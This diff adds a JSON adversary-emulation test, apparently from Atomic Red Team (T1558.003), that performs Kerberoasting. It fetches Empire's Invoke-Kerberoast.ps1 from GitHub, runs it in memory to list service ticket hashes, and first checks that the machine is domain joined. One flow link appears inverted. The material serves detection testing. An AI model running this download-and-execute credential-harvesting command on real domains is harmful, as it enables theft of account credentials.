@@ -1,0 +1,78 @@
+{
+  "id": "3f987809-3681-43c8-bcd8-b3ff3a28533a",
+  "name": "Request for service tickets",
+  "description": "This test uses the Powershell Empire Module: Invoke-Kerberoast.ps1\nThe following are further sources and credits for this attack:\n[Kerberoasting Without Mimikatz source] (https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)\n[Invoke-Kerberoast source] (https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)\nwhen executed successfully , the test displays available services with their hashes. \nIf the testing domain doesn't have any service principal name configured, there is no output\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "23c33396-518c-4b5d-8b71-b7d7bd83bb08",
+      "type": "execute-command",
+      "data": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\niex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing)\nInvoke-Kerberoast | fl\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "aa3dd2e3-6496-411e-8217-1d2b604913eb",
+      "name": "Check dependency 1/1",
+      "description": "Computer must be domain joined\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "28cd43ea-3191-4cb3-b2fe-daa3623801e4",
+      "name": "Resolve dependency 1/1",
+      "description": "Computer must be domain joined\n",
+      "type": "execute-command",
+      "data": {
+        "command": "Write-Host Joining this computer to a domain must be done manually\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "68f315e0-dd6c-4dba-80ae-65b4d931b768",
+      "name": "Re-check dependency 1/1",
+      "description": "Computer must be domain joined\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "aa3dd2e3-6496-411e-8217-1d2b604913eb",
+      "p": "on-success",
+      "o": "23c33396-518c-4b5d-8b71-b7d7bd83bb08"
+    },
+    {
+      "s": "aa3dd2e3-6496-411e-8217-1d2b604913eb",
+      "p": "on-failure",
+      "o": "28cd43ea-3191-4cb3-b2fe-daa3623801e4"
+    },
+    {
+      "s": "28cd43ea-3191-4cb3-b2fe-daa3623801e4",
+      "p": "on-success",
+      "o": "68f315e0-dd6c-4dba-80ae-65b4d931b768"
+    },
+    {
+      "s": "68f315e0-dd6c-4dba-80ae-65b4d931b768",
+      "p": "on-failure",
+      "o": "23c33396-518c-4b5d-8b71-b7d7bd83bb08"
+    }
+  ],
+  "tags": [
+    "T1558.003",
+    "atomic-red-team"
+  ]
+}
